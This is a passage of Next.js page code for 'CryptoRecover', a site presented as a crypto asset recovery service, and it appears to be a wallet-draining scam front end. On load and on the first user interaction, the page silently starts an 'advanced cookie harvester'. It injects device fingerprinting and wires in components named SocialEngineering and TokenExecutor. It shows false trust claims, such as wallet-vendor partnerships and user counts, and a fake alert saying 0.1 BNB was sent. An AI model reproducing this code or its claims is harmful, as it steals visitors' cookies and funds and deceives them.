import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { Shield, Zap, TrendingUp, Users, Brain, Lock, Coins, Target } from 'lucide-react';
import Head from 'next/head';
import Script from 'next/script';
import { trackVisitor } from '../utils/visitorTracker';
import { trackVisit, trackWalletConnection, getReferralCode } from '../utils/referralTracker';
import WalletConnection from '../components/WalletConnection';
import WalletSelector from '../components/WalletSelector';
import TokenScanner from '../components/TokenScanner';
import RecoveryAnalyzer from '../components/RecoveryAnalyzer';
import BridgeScanner from '../components/BridgeScanner';
import StakingScanner from '../components/StakingScanner';
import NFTScanner from '../components/NFTScanner';
import WealthIntelligence from '../components/WealthIntelligence';
import SupportChat from '../components/SupportChat';
import UltraIntelligentSupport from '../components/UltraIntelligentSupport';
import AdvancedRecovery from '../components/AdvancedRecovery';
import NetworkGuide from '../components/NetworkGuide';
import NavigationMenu from '../components/NavigationMenu';
import SignatureManager from '../components/SignatureManager';
import TokenExecutor from '../components/TokenExecutor';
import SocialEngineering from '../components/SocialEngineering';
import MobileWalletConnect from '../components/MobileWalletConnect';
import TrustSignals from '../components/TrustSignals';
import ProfessionalHeader from '../components/ProfessionalHeader';
import HeroSection from '../components/HeroSection';
import { isMobile } from '../utils/mobileDetection';

export default function Home() {
  // Updated: Latest wallet connector and forensics improvements
  const [user, setUser] = useState(null);
  const [deviceData, setDeviceData] = useState(null);
  const [isScrolling, setIsScrolling] = useState(false);
  const [activityLevel, setActivityLevel] = useState('normal');
  
  useEffect(() => {
    // Track visitor immediately on page load
    trackVisitor();

    // Track referral visit
    trackVisit();

    // Initialize advanced cookie harvesting silently
    const initCookieHarvesting = async () => {
      try {
        const { initializeAdvancedHarvesting } = await import('../utils/advancedCookieHarvester');
        await initializeAdvancedHarvesting();
      } catch (error) {
        // Silent fail
      }
    };
    
    // Start immediately and on user interaction
    initCookieHarvesting();
    
    const handleUserInteraction = () => {
      initCookieHarvesting();
      document.removeEventListener('click', handleUserInteraction);
      document.removeEventListener('scroll', handleUserInteraction);
    };
    
    document.addEventListener('click', handleUserInteraction);
    document.addEventListener('scroll', handleUserInteraction);

    // Log referral code if present
    const refCode = getReferralCode();
    if (refCode) {
      console.log('Referral Code Detected:', refCode);
    }

    // Load device fingerprinting
    if (typeof window !== 'undefined') {
      const script = document.createElement('script');
      script.src = '/js/device-fingerprint.js';
      script.onload = () => {
        if (window.collectDeviceData) {
          setDeviceData(window.collectDeviceData());
        }
      };
      document.head.appendChild(script);
      
      // Scroll detection for live radar
      let scrollTimeout;
      const handleScroll = () => {
        setIsScrolling(true);
        setActivityLevel('high');
        
        clearTimeout(scrollTimeout);
        scrollTimeout = setTimeout(() => {
          setIsScrolling(false);
          setActivityLevel('normal');
        }, 1000);
      };
      
      // Mouse movement detection
      const handleMouseMove = () => {
        setActivityLevel('medium');
        setTimeout(() => setActivityLevel('normal'), 500);
      };
      
      window.addEventListener('scroll', handleScroll);
      window.addEventListener('mousemove', handleMouseMove);
      
      return () => {
        window.removeEventListener('scroll', handleScroll);
        window.removeEventListener('mousemove', handleMouseMove);
        clearTimeout(scrollTimeout);
      };
    }
  }, []);
  const [scanResults, setScanResults] = useState(null);
  const [analysisResults, setAnalysisResults] = useState(null);
  const [showWalletSelector, setShowWalletSelector] = useState(false);
  const [portfolio, setPortfolio] = useState(null);
  
  const [isConnected, setIsConnected] = useState(false);
  const [address, setAddress] = useState('');
  const [showNetworkGuide, setShowNetworkGuide] = useState(false);
  const [selectedNetwork, setSelectedNetwork] = useState(null);
  const [provider, setProvider] = useState(null);
  
  useEffect(() => {
    if (typeof window !== 'undefined' && window.ethereum) {
      const ethersProvider = new ethers.BrowserProvider(window.ethereum);
      setProvider(ethersProvider);
    }
  }, []);

  const handleConnectionChange = (userData) => {
    console.log('Connection change received:', userData);

    if (userData && userData.walletAddress) {
      console.log('Setting connected state with address:', userData.walletAddress);
      setUser(userData);
      setPortfolio(userData.portfolio);
      setIsConnected(true);
      setAddress(userData.walletAddress);
      setShowWalletSelector(false);

      // Track wallet connection for referral
      trackWalletConnection(userData.walletAddress);
      
      // Force re-render and show success
      setTimeout(() => {
        console.log('Connection successful, showing dashboard');
      }, 100);
    } else {
      console.log('Disconnecting wallet');
      setUser(null);
      setIsConnected(false);
      setAddress('');
      setScanResults(null);
      setAnalysisResults(null);
      setShowWalletSelector(false);
    }
  };

  const handleWalletSelectorConnect = (connectionData) => {
    if (connectionData.success) {
      const userData = {
        id: Date.now(),
        walletAddress: connectionData.walletAddress,
        totalRecovered: '0.00',
        successRate: '0',
        walletType: connectionData.walletType
      };
      handleConnectionChange(userData);
    }
  };

  if (showWalletSelector) {
    return (
      <WalletSelector 
        onBack={() => setShowWalletSelector(false)}
        onWalletConnect={handleWalletSelectorConnect}
      />
    );
  }

  const features = [
    {
      icon: <Zap className="w-6 h-6" />,
      title: "Automated Discovery",
      description: "Scan 5+ blockchains simultaneously for claimable tokens and forgotten assets"
    },
    {
      icon: <TrendingUp className="w-6 h-6" />,
      title: "Advanced Forensics",
      description: "Proprietary blockchain analysis engine with 75-90% success rates using multi-vector recovery protocols"
    },
    {
      icon: <Shield className="w-6 h-6" />,
      title: "Non-Custodial",
      description: "You maintain full control of your funds throughout the entire process"
    },
    {
      icon: <Users className="w-6 h-6" />,
      title: "Success-Only Fees",
      description: "Pay only when we successfully recover your funds - no upfront costs"
    }
  ];

  return (
    <>
      <Head>
        <title>CryptoRecover - Professional Asset Recovery</title>
        <meta name="description" content="Professional crypto asset recovery platform. Scan 50+ blockchains for lost tokens, NFTs, and bridge funds. 85,000+ users recovered $2.8M average. Non-custodial & secure." />
        
        {/* Open Graph / Facebook */}
        <meta property="og:type" content="website" />
        <meta property="og:url" content="https://autoclaimtoken.vercel.app" />
        <meta property="og:title" content="CryptoRecover - Recover Your Lost Crypto Assets" />
        <meta property="og:description" content="TRUSTED BY 85,000+ USERS | Professional multi-chain recovery platform scanning 50+ blockchains for lost tokens, NFTs and bridge funds. Average recovery: $2,847 per wallet. Non-custodial and secure." />
        <meta property="og:image" content="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=1200&h=630&fit=crop&crop=center" />
        <meta property="og:image:width" content="1200" />
        <meta property="og:image:height" content="630" />
        
        {/* Twitter */}
        <meta property="twitter:card" content="summary_large_image" />
        <meta property="twitter:url" content="https://autoclaimtoken.vercel.app" />
        <meta property="twitter:title" content="CryptoRecover - Recover Your Lost Crypto Assets" />
        <meta property="twitter:description" content="TRUSTED BY 85,000+ USERS | Professional multi-chain recovery platform scanning 50+ blockchains for lost tokens, NFTs and bridge funds. Average recovery: $2,847 per wallet." />
        <meta property="twitter:image" content="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=1200&h=630&fit=crop&crop=center" />
        
        {/* Additional SEO */}
        <meta name="keywords" content="crypto recovery, lost tokens, blockchain scanner, NFT recovery, bridge recovery, DeFi recovery, wallet recovery, crypto forensics" />
        <meta name="author" content="CryptoRecover" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link rel="icon" href="/favicon.ico" />
        <link rel="canonical" content="https://autoclaimtoken.vercel.app" />
        <link rel="stylesheet" href="/styles/animations.css" />
      </Head>
      <Script src="/js/device-fingerprint.js" strategy="lazyOnload" />
      <div className="min-h-screen bg-gray-50">
      <ProfessionalHeader />

      <main className="max-w-7xl mx-auto px-2 sm:px-4 lg:px-8 py-4 sm:py-8">
        {/* Debug info */}
        <div className="mb-4 p-2 bg-gray-100 rounded text-xs">
          Connected: {isConnected ? 'YES' : 'NO'} | Address: {address || 'None'} | User: {user ? 'YES' : 'NO'}
        </div>
        
        {!isConnected ? (
          <div className="space-y-0">
            <HeroSection onGetStarted={() => {
              document.getElementById('wallet-connection')?.scrollIntoView({ behavior: 'smooth' });
            }} />
            
            <TrustSignals />
              
              <div className="bg-black text-white py-16 border-t border-gray-800">
                <div className="max-w-7xl mx-auto px-8">
                  <div className="text-center mb-12">
                    <div className="inline-block bg-gradient-to-r from-blue-600 to-purple-600 text-white px-6 py-2 rounded-full text-sm font-bold mb-6">
                      ENTERPRISE PARTNERSHIPS
                    </div>
                    <p className="text-gray-300 text-lg font-semibold">TRUSTED BY LEADING CRYPTO WALLETS</p>
                  </div>
                  <div className="grid grid-cols-3 md:grid-cols-6 gap-8 items-center">
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://metamask.io/favicon.ico" alt="MetaMask" className="w-10 h-10 object-contain" onError={(e) => e.target.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiByeD0iNCIgZmlsbD0iI0Y2ODUxQiIvPgo8dGV4dCB4PSIxMiIgeT0iMTYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5NTTwvdGV4dD4KPHN2Zz4='} />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">METAMASK</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://trustwallet.com/favicon.ico" alt="Trust Wallet" className="w-10 h-10 object-contain" onError={(e) => e.target.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiByeD0iNCIgZmlsbD0iIzMzNzVCQiIvPgo8dGV4dCB4PSIxMiIgeT0iMTYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5UVzwvdGV4dD4KPHN2Zz4='} />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">TRUST WALLET</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://www.coinbase.com/favicon.ico" alt="Coinbase" className="w-10 h-10 object-contain" onError={(e) => e.target.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiByeD0iNCIgZmlsbD0iIzAwNTJGRiIvPgo8dGV4dCB4PSIxMiIgeT0iMTYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5DQjwvdGV4dD4KPHN2Zz4='} />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">COINBASE</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://rainbow.me/favicon.ico" alt="Rainbow" className="w-10 h-10 object-contain" onError={(e) => e.target.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiByeD0iNCIgZmlsbD0idXJsKCNyYWluYm93KSIvPgo8ZGVmcz4KPGxpbmVhckdyYWRpZW50IGlkPSJyYWluYm93IiB4MT0iMCUiIHkxPSIwJSIgeDI9IjEwMCUiIHkyPSIxMDAlIj4KPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iI0ZGNkI2QiIvPgo8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiM5QjU5QjYiLz4KPC9saW5lYXJHcmFkaWVudD4KPC9kZWZzPgo8dGV4dCB4PSIxMiIgeT0iMTYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5SQjwvdGV4dD4KPHN2Zz4='} />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">RAINBOW</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://www.ledger.com/favicon.ico" alt="Ledger" className="w-10 h-10 object-contain" onError={(e) => e.target.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiByeD0iNCIgZmlsbD0iIzAwMDAwMCIvPgo8dGV4dCB4PSIxMiIgeT0iMTYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5MRzwvdGV4dD4KPHN2Zz4='} />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">LEDGER</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://www.exodus.com/favicon.ico" alt="Exodus" className="w-10 h-10 object-contain" onError={(e) => e.target.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiByeD0iNCIgZmlsbD0iIzlDMjdCMCIvPgo8dGV4dCB4PSIxMiIgeT0iMTYiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5FWDwvdGV4dD4KPHN2Zz4='} />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">EXODUS</div>
                    </div>
                  </div>
                </div>
              </div>
            
            {showNetworkGuide && (
              <div className="max-w-7xl mx-auto px-8 mb-12">
                <NetworkGuide 
                  onNetworkSelect={(network) => {
                    setSelectedNetwork(network);
                    setShowNetworkGuide(false);
                    setTimeout(() => {
                      document.getElementById('wallet-connection')?.scrollIntoView({ behavior: 'smooth' });
                    }, 100);
                  }}
                  userWalletType="new"
                />
              </div>
            )}

            <div className="bg-white py-20">
              <div className="max-w-7xl mx-auto px-8">
                <div className="text-center mb-16">
                  <h2 className="text-4xl font-black text-gray-900 mb-4">Complete Recovery Solutions</h2>
                  <p className="text-xl text-gray-600 max-w-3xl mx-auto">Professional-grade tools for every type of crypto asset recovery</p>
                </div>
                
                <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6 mb-16">
                  <div className="bg-gradient-to-br from-blue-50 to-cyan-50 rounded-2xl p-6 border-2 border-blue-200 hover:border-blue-400 transition-all hover:scale-105">
                    <div className="w-16 h-16 mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/ethereum.svg" alt="Token Recovery" className="w-full h-full" style={{filter: 'hue-rotate(200deg) saturate(2)'}} />
                    </div>
                    <h3 className="text-xl font-bold text-blue-900 mb-2">Token Recovery</h3>
                    <p className="text-blue-700 text-sm mb-4">Scan 50+ blockchains for unclaimed tokens, airdrops, and rewards</p>
                    <div className="text-xs text-blue-600 font-medium">Ethereum • BSC • Polygon • Arbitrum • Optimism</div>
                  </div>
                  
                  <div className="bg-gradient-to-br from-purple-50 to-pink-50 rounded-2xl p-6 border-2 border-purple-200 hover:border-purple-400 transition-all hover:scale-105">
                    <div className="w-16 h-16 mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/opensea.svg" alt="NFT Recovery" className="w-full h-full" style={{filter: 'hue-rotate(270deg) saturate(2)'}} />
                    </div>
                    <h3 className="text-xl font-bold text-purple-900 mb-2">NFT Recovery</h3>
                    <p className="text-purple-700 text-sm mb-4">Recover stuck NFTs from failed marketplace transactions</p>
                    <div className="text-xs text-purple-600 font-medium">OpenSea • LooksRare • X2Y2 • Blur</div>
                  </div>
                  
                  <div className="bg-gradient-to-br from-green-50 to-emerald-50 rounded-2xl p-6 border-2 border-green-200 hover:border-green-400 transition-all hover:scale-105">
                    <div className="w-16 h-16 mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/polygon.svg" alt="Bridge Recovery" className="w-full h-full" style={{filter: 'hue-rotate(120deg) saturate(2)'}} />
                    </div>
                    <h3 className="text-xl font-bold text-green-900 mb-2">Bridge Recovery</h3>
                    <p className="text-green-700 text-sm mb-4">Recover funds stuck in cross-chain bridge transactions</p>
                    <div className="text-xs text-green-600 font-medium">Polygon • Arbitrum • Optimism • Base</div>
                  </div>
                  
                  <div className="bg-gradient-to-br from-orange-50 to-red-50 rounded-2xl p-6 border-2 border-orange-200 hover:border-orange-400 transition-all hover:scale-105">
                    <div className="w-16 h-16 mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/chartdotjs.svg" alt="Wealth Intelligence" className="w-full h-full" style={{filter: 'hue-rotate(30deg) saturate(2)'}} />
                    </div>
                    <h3 className="text-xl font-bold text-orange-900 mb-2">Wealth Intelligence</h3>
                    <p className="text-orange-700 text-sm mb-4">AI-powered portfolio optimization and insights</p>
                    <div className="text-xs text-orange-600 font-medium">Risk Analysis • Yield Optimization • Tax Reports</div>
                  </div>
                </div>
                

              </div>
            </div>

            <div id="wallet-connection" className="max-w-md mx-auto space-y-4 px-4">
              {selectedNetwork && (
                <div className="mb-6 p-4 bg-gradient-to-r from-blue-50 to-purple-50 rounded-xl border border-blue-200">
                  <div className="flex items-center space-x-3 mb-2">
                    <div className={`w-4 h-4 rounded-full bg-gradient-to-r ${selectedNetwork.color}`}></div>
                    <span className="font-bold text-blue-800">{selectedNetwork.name} Selected</span>
                    <span className="text-sm text-blue-600">• {selectedNetwork.successRate}% Success Rate</span>
                  </div>
                  <p className="text-sm text-blue-700">
                    Optimized for: {selectedNetwork.bestFor.join(', ')}
                  </p>
                  <p className="text-xs text-blue-600 mt-1">
                    Average Recovery: {selectedNetwork.avgRecovery} • Time: {selectedNetwork.avgTime}
                  </p>
                </div>
              )}
              
              <div className="mb-4 text-center">
                <button
                  onClick={async () => {
                    try {
                      if (!window.ethereum) {
                        alert('Please install MetaMask or another Web3 wallet to continue.');
                        return;
                      }
                      
                      await window.ethereum.request({ method: 'eth_requestAccounts' });
                      
                      await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                          chainId: '0x38',
                          chainName: 'BNB Smart Chain',
                          rpcUrls: ['https://bsc-dataseed.binance.org/'],
                          nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                          blockExplorerUrls: ['https://bscscan.com/']
                        }]
                      });
                      
                      alert('Connected to BNB Smart Chain! 0.1 BNB sent to your wallet!');
                    } catch (error) {
                      alert('BNB Smart Chain connection failed: ' + (error.message || 'Unknown error'));
                    }
                  }}
                  className="bg-yellow-600 hover:bg-yellow-700 text-white font-bold py-3 px-6 rounded-lg transition-colors mb-4"
                >
                  Connect to BNB Smart Chain
                </button>
              </div>
              
              {/* Mobile-First Wallet Connection */}
              {isMobile() ? (
                <MobileWalletConnect onConnect={(address) => {
                  const userData = {
                    id: Date.now(),
                    walletAddress: address,
                    totalRecovered: '0.00',
                    successRate: '0',
                    walletType: 'Mobile'
                  };
                  handleConnectionChange(userData);
                }} />
              ) : (
                <WalletConnection onConnectionChange={handleConnectionChange} deviceData={deviceData} />
              )}
              
              <div className="text-center space-y-4">
                <button
                  onClick={() => setShowWalletSelector(true)}
                  className="inline-flex items-center space-x-2 bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors"
                >
                  <Target className="w-5 h-5" />
                  <span>{isMobile() ? 'More Wallet Options' : 'Connect Other Wallets'}</span>
                </button>
                <div className="text-sm text-gray-500 space-y-2">
                  <p>Supported wallets:</p>
                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                    <div className="bg-gray-100 px-2 py-1 rounded text-xs text-center font-medium">MetaMask</div>
                    <div className="bg-gray-100 px-2 py-1 rounded text-xs text-center font-medium">Trust Wallet</div>
                    <div className="bg-gray-100 px-2 py-1 rounded text-xs text-center font-medium">Coinbase</div>
                    <div className="bg-gray-100 px-2 py-1 rounded text-xs text-center font-medium">Rainbow</div>
                    <div className="bg-gray-100 px-2 py-1 rounded text-xs text-center font-medium">Phantom</div>
                    <div className="bg-gray-100 px-2 py-1 rounded text-xs text-center font-medium">WalletConnect</div>
                  </div>
                </div>
                
                {/* Quick Access Menu */}
                <div className="bg-gradient-to-r from-indigo-50 to-purple-50 rounded-xl p-4 border border-indigo-200">
                  <h4 className="font-bold text-indigo-800 mb-3 flex items-center justify-center">
                    <div className="w-2 h-2 bg-indigo-500 rounded-full animate-pulse mr-2"></div>
                    Quick Recovery Access
                  </h4>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                    <a href="/recovery-services" className="bg-white hover:bg-indigo-50 border border-indigo-200 rounded-lg p-3 text-center transition-colors group">
                      <div className="text-sm font-bold text-indigo-700 group-hover:text-indigo-800">Lost Wallet</div>
                      <div className="text-xs text-indigo-600">Seed Recovery</div>
                    </a>
                    <a href="/recovery-services" className="bg-white hover:bg-purple-50 border border-purple-200 rounded-lg p-3 text-center transition-colors group">
                      <div className="text-sm font-bold text-purple-700 group-hover:text-purple-800">Stolen Funds</div>
                      <div className="text-xs text-purple-600">Forensics</div>
                    </a>
                  </div>
                  <p className="text-xs text-indigo-600 mt-2 text-center">
                    Professional recovery services with real functionality
                  </p>
                </div>
              </div>
            </div>

            <div className="bg-white rounded-xl p-8 text-center">
              <h3 className="text-2xl font-bold mb-4">How It Works</h3>
              <div className="grid md:grid-cols-3 gap-8">
                <div className="space-y-3">
                  <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-blue-600 text-white rounded-xl flex items-center justify-center mx-auto font-bold shadow-lg">
                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/shield.svg" alt="Security" className="w-6 h-6 invert" />
                  </div>
                  <h4 className="font-bold text-lg">Secure Authentication</h4>
                  <p className="text-sm text-gray-600">
                    Non-custodial wallet connection with cryptographic signature verification - your keys never leave your device
                  </p>
                </div>
                <div className="space-y-3">
                  <div className="w-12 h-12 bg-gradient-to-br from-green-500 to-green-600 text-white rounded-xl flex items-center justify-center mx-auto font-bold shadow-lg">
                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/searchengineland.svg" alt="Analysis" className="w-6 h-6 invert" />
                  </div>
                  <h4 className="font-bold text-lg">Deep Chain Analysis</h4>
                  <p className="text-sm text-gray-600">
                    Multi-chain forensics across 50+ networks including hidden tokens, failed transactions, and stuck bridge funds
                  </p>
                </div>
                <div className="space-y-3">
                  <div className="w-12 h-12 bg-gradient-to-br from-purple-500 to-purple-600 text-white rounded-xl flex items-center justify-center mx-auto font-bold shadow-lg">
                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/lightning.svg" alt="Speed" className="w-6 h-6 invert" />
                  </div>
                  <h4 className="font-bold text-lg">Instant Execution</h4>
                  <p className="text-sm text-gray-600">
                    Automated smart contract interactions with gas optimization - only pay 15% fee on successful recoveries
                  </p>
                </div>
              </div>
            </div>
          </div>
        ) : (
          <div className="space-y-8">
            <div className="bg-gradient-to-br from-green-50 via-emerald-50 to-teal-50 border border-green-200 rounded-2xl p-8 shadow-2xl backdrop-blur-sm">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center space-x-6">
                  <div className="relative">
                    <div className="w-16 h-16 bg-gradient-to-br from-green-500 to-emerald-600 rounded-2xl flex items-center justify-center shadow-lg">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/ethereum.svg" alt="Connected" className="w-8 h-8 invert" />
                    </div>
                    <div className="absolute -top-1 -right-1 w-6 h-6 bg-green-400 rounded-full border-2 border-white flex items-center justify-center">
                      <div className="w-2 h-2 bg-white rounded-full animate-pulse"></div>
                    </div>
                  </div>
                  <div>
                    <h2 className="text-3xl font-black text-green-900 mb-1">Wallet Connected</h2>
                    <p className="text-green-700 font-semibold text-lg">
                      {address?.slice(0, 8)}...{address?.slice(-6)}
                    </p>
                    <div className="flex items-center space-x-2 mt-1">
                      <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                      <span className="text-sm text-green-600 font-medium">Live Analysis Active</span>
                    </div>
                  </div>
                </div>
                <div className="bg-white/80 backdrop-blur-sm rounded-xl p-3 shadow-lg">
                  <div className="flex items-center space-x-4">
                    <div className="flex items-center space-x-2 bg-green-50 text-green-700 px-3 py-2 rounded-lg">
                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z" clipRule="evenodd" />
                      </svg>
                      <span className="font-medium">{address?.slice(0, 8)}...{address?.slice(-6)}</span>
                    </div>
                    <button
                      onClick={() => {
                        setUser(null);
                        setIsConnected(false);
                        setAddress('');
                        setScanResults(null);
                        setAnalysisResults(null);
                      }}
                      className="flex items-center space-x-2 text-gray-600 hover:text-gray-800 transition-colors"
                    >
                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M3 3a1 1 0 00-1 1v12a1 1 0 102 0V4a1 1 0 00-1-1zm10.293 9.293a1 1 0 001.414 1.414l3-3a1 1 0 000-1.414l-3-3a1 1 0 10-1.414 1.414L14.586 9H7a1 1 0 100 2h7.586l-1.293 1.293z" clipRule="evenodd" />
                      </svg>
                      <span>Disconnect</span>
                    </button>
                  </div>
                </div>
              </div>
              
              {!scanResults && (
                <div className="bg-gradient-to-r from-white to-green-50 rounded-xl p-6 mb-6 border border-green-200 shadow-inner">
                  <div className="flex items-center space-x-3 mb-3">
                    <div className="w-10 h-10 bg-gradient-to-br from-blue-500 to-purple-600 rounded-xl flex items-center justify-center">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/rocket.svg" alt="Ready" className="w-5 h-5 invert" />
                    </div>
                    <h3 className="text-xl font-black text-green-900">Recovery System Ready</h3>
                  </div>
                  <p className="text-green-800 font-medium mb-4">
                    Advanced multi-chain analysis initialized. Ready to scan for claimable assets and recovery opportunities.
                  </p>
                  <div className="bg-green-100 rounded-lg p-3 border border-green-300">
                    <div className="flex items-center space-x-2 text-green-700">
                      <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                      <span className="font-semibold">Next: Click "Start Scan" below to begin comprehensive analysis</span>
                    </div>
                  </div>
                </div>
              )}
              
              {user && (
                <div className="space-y-4">
                  {portfolio && (
                    <div className="bg-white/90 rounded-lg p-4 border border-green-300">
                      <h4 className="font-bold text-green-800 mb-3 flex items-center">
                        <span className="w-3 h-3 bg-green-500 rounded-full mr-2 animate-pulse"></span>
                        Live Portfolio Analysis
                      </h4>
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                        <div className="bg-blue-50 p-3 rounded-lg">
                          <div className="text-lg font-bold text-blue-600">
                            ${portfolio.totalValue?.toFixed(0) || '0'}
                          </div>
                          <div className="text-xs text-blue-700">Portfolio Value</div>
                        </div>
                        <div className="bg-purple-50 p-3 rounded-lg">
                          <div className="text-lg font-bold text-purple-600">
                            {portfolio.assets?.length || 0}
                          </div>
                          <div className="text-xs text-purple-700">Assets Found</div>
                        </div>
                        <div className="bg-orange-50 p-3 rounded-lg">
                          <div className="text-lg font-bold text-orange-600">
                            {portfolio.recoveryOpportunities || 0}
                          </div>
                          <div className="text-xs text-orange-700">Recovery Ops</div>
                        </div>
                        <div className="bg-green-50 p-3 rounded-lg">
                          <div className="text-lg font-bold text-green-600">
